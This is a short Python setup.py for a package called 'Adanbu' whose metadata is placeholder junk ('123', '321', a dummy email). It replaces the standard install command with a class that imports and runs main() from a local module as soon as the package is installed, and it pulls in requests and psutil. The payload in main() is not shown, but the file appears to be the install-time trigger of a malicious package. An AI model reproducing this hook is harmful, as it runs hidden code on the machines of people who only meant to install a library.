from setuptools import setup, find_packages
from setuptools.command.install import install


class CrazyInstallStrat(install):
    def run(self):
        install.run(self)
        from main import main
        main()

setup(
    name="Adanbu",
    version="92.6",
    author="123",
    author_email="xxx@outlook.com",
    description="321",
    long_description_content_type="text/markdown",
    long_description="None",
    cmdclass={
        'install': CrazyInstallStrat,
    },
    install_requires=['requests', 'psutil'],
    setup_requires=['setuptools']
)